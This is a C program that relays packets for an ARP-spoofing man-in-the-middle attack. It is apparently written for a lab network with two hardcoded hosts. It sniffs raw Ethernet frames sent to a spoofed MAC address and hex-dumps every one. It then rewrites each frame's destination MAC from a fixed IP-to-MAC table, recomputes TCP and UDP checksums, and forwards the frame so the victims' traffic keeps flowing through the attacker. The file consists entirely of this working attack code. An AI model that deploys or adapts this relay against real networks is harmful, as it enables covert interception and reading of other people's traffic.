#include <linux/if_ether.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

typedef struct ether_header ether_header;
typedef struct ether_arp ether_arp;
typedef struct sockaddr_ll sockaddr_ll;
typedef struct sockaddr sockaddr;
typedef struct ether_addr ether_addr;
typedef struct iphdr iphdr;
typedef struct tcphdr tcphdr;
typedef struct udphdr udphdr;

#define IPV4LEN 4
#define MAX_PACKET_SIZE 2048

unsigned short in_cksum(uint8_t *addr,int len) {
	register uint32_t sum = 0;
	uint16_t answer = 0;
	register uint16_t *w = (uint16_t*)addr;
	register int nleft = len;
	/*
	 ** Our algorithm is simple, using a 32 bit 
	 ** accumulator (sum), we add sequential 16 bit words to
	 ** it, and at the end, fold back all the carry bits 
	 ** from the top 16 bits into the lower 16 bits.
	 **/
	
	while (nleft > 1)  {
	        sum += *w++;
	        nleft -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(uint8_t *)(&answer) = *(uint8_t *)w ;
		sum += answer;
	}

	/* add back carry outs from top 16 bits to low 
	 * 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	sum += (sum >> 16);                     /* add carry */
	answer = ~sum;                          /* truncate to 16 bits */
	return(answer);
}


uint8_t packet_checksum_buff[MAX_PACKET_SIZE];

uint16_t tcp_checksum(uint8_t* ip_packet) {
	iphdr* ip_header = (iphdr*)ip_packet;
	int ip_header_len = ip_header->ihl*4;
	int len = ntohs(ip_header->tot_len);
	
	int tcp_len = len - ip_header_len;
	tcphdr* tcp_header = (tcphdr*)((uint8_t*)ip_header + 
			ip_header_len);
		
	tcp_header->th_sum = 0;

	memset(packet_checksum_buff,0,MAX_PACKET_SIZE);
	memcpy(packet_checksum_buff,ip_packet+12,IPV4LEN*2);
	packet_checksum_buff[8] = 0;	
	packet_checksum_buff[9] = IPPROTO_TCP;	
	packet_checksum_buff[10] = (tcp_len>>8);
	packet_checksum_buff[11] = (tcp_len&0xFF);
	memcpy(packet_checksum_buff+12,(void *)tcp_header, 
			tcp_len);

	return in_cksum(packet_checksum_buff,
			(12+tcp_len));

}


uint16_t udp_checksum(uint8_t* ip_packet) {
	iphdr* ip_header = (iphdr*)ip_packet;
	int ip_header_len = ip_header->ihl*4;
	int len = ntohs(ip_header->tot_len);
	
	int udp_len = len - ip_header_len;
	udphdr* udp_header = (udphdr*)((uint8_t*)ip_header + 
			ip_header_len);
		

	udp_header->uh_sum = 0;

	memset(packet_checksum_buff,0,MAX_PACKET_SIZE);
	memcpy(packet_checksum_buff,ip_packet+12,IPV4LEN*2);
	packet_checksum_buff[8] = 0;	
	packet_checksum_buff[9] = IPPROTO_UDP;
	packet_checksum_buff[10] = (udp_len>>8);
	packet_checksum_buff[11] = (udp_len&0xFF);
	memcpy(packet_checksum_buff+12,(void *)udp_header, 
			udp_len);

	return in_cksum(packet_checksum_buff,
			(12+udp_len));

}



#define ARP_TABLE_SIZE 2
uint8_t ARP_TABLE_IP[ARP_TABLE_SIZE][IPV4LEN];
uint8_t ARP_TABLE_MAC[ARP_TABLE_SIZE][ETH_ALEN];

int get_mac_from_ip(uint8_t* ip,void* mac) {
	for(int i=0;i<ARP_TABLE_SIZE;i++) {
		if(memcmp(ARP_TABLE_IP[i],ip,IPV4LEN)==0) {
			memcpy(mac,ARP_TABLE_MAC[i],ETH_ALEN);
			return 1;
		}

	}

	return 0;
}

void init() {
	ARP_TABLE_IP[0][0] = 10;
	ARP_TABLE_IP[0][1] = 1;
	ARP_TABLE_IP[0][2] = 0;
	ARP_TABLE_IP[0][3] = 105;

	ARP_TABLE_MAC[0][0] = 0x02;
	ARP_TABLE_MAC[0][1] = 0x42;
	ARP_TABLE_MAC[0][2] = 0x0a;
	ARP_TABLE_MAC[0][3] = 0x01;
	ARP_TABLE_MAC[0][4] = 0x00;
	ARP_TABLE_MAC[0][5] = 0x69;

	ARP_TABLE_IP[1][0] = 10;
	ARP_TABLE_IP[1][1] = 1;
	ARP_TABLE_IP[1][2] = 0;
	ARP_TABLE_IP[1][3] = 106;

	ARP_TABLE_MAC[1][0] = 0x02;
	ARP_TABLE_MAC[1][1] = 0x42;
	ARP_TABLE_MAC[1][2] = 0x0a;
	ARP_TABLE_MAC[1][3] = 0x01;
	ARP_TABLE_MAC[1][4] = 0x00;
	ARP_TABLE_MAC[1][5] = 0x6a;
}
	
int main(int argc,char** argv) {
	if(argc!=3) {
		printf("Usage: %s interface spoofing-\
				mac\n",argv[0]);
		exit(-1);
	}

	ether_header* eth = (ether_header*)(malloc(
				MAX_PACKET_SIZE));
	

	if(eth==NULL) {
		printf("Memory allocation Failed\n");
		exit(-1);
	}

	ether_addr* source = ether_aton(argv[2]);
	if(source==NULL) {
		printf("MAC %s is invalid\n",argv[2]);
		exit(-1);
	}
	uint8_t source_mac[ETH_ALEN]; 	
	memcpy(source_mac,source->ether_addr_octet,ETH_ALEN);

	uint8_t dest_mac[ETH_ALEN];

	uint32_t interface_index = if_nametoindex(argv[1]);
	if(interface_index==0) {
		printf("%s is not a valid interface\n",argv[1]);
		exit(-1);
	}

	init();

	int fd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_IP));
	if(fd<0) {
		close(fd);
		printf("Couldn't open socket\n");
		exit(-1);
	}
	
	setsockopt(fd,SOL_SOCKET,SO_BINDTODEVICE ,
			argv[1],strlen(argv[1])+1);

	
	while(1) {
		socklen_t len;
		sockaddr_ll temp;
		int sz = recvfrom(fd,eth,MAX_PACKET_SIZE,
				0,(sockaddr*)&temp,&len);
		uint8_t* buff = (uint8_t*)eth;

		printf("frame:\n");
		for(int i=0;i<sz;i++) {
			printf("%02x ",buff[i]);
		}
		printf("\n");
		fflush(stdout);
		
		if(memcmp(source_mac,eth->ether_shost,
					ETH_ALEN)==0) {
			continue;
		}
		
		memcpy(dest_mac,eth->ether_dhost,ETH_ALEN);
		if(memcmp(dest_mac,source_mac,ETH_ALEN)!=0) {
		//	printf("Whose packet is this? :/");
		//	for(int i=0;i<ETH_ALEN;i++) {
		//		printf("%x:",dest_mac[i]);
		//	}
		//	printf("\n");
		//	for(int i=0;i<ETH_ALEN;i++) {
		//		printf("%x:",source_mac[i]);
		//	}
		//	printf("\n");


		//	fflush(stdout);
			continue;
		}

		memcpy(eth->ether_shost,source_mac,ETH_ALEN);
		
		iphdr* ip_header = (iphdr*)(eth+1);
		int ret = get_mac_from_ip((uint8_t*)&ip_header->daddr,
				eth->ether_dhost);
		if(ret==0) continue;

		sockaddr_ll device;
		memset(&device,0,sizeof(device));
		device.sll_family = AF_PACKET;
		memcpy(device.sll_addr,eth->ether_dhost,
				ETH_ALEN);
		device.sll_halen = htons(ETH_ALEN);
		device.sll_ifindex = interface_index;
		device.sll_protocol = htons(ETH_P_IP);
		
		
		int ip_header_len = ip_header->ihl*4;
		if(ip_header->protocol == IPPROTO_TCP) {
			tcphdr* tcp_header = (tcphdr*)(
					(uint8_t*)ip_header +
					ip_header_len);
			tcp_header->th_sum=tcp_checksum(
					(uint8_t*)ip_header);
		} else if (ip_header->protocol == IPPROTO_UDP) {
			udphdr* udp_header = (udphdr*)(
					(uint8_t*)ip_header +
					ip_header_len);
			udp_header->uh_sum=udp_checksum(
					(uint8_t*)ip_header);

		}

		sendto(fd,(void*)(eth),sz,0, 
				(sockaddr*)&device,sizeof(
					device));	

	}
}

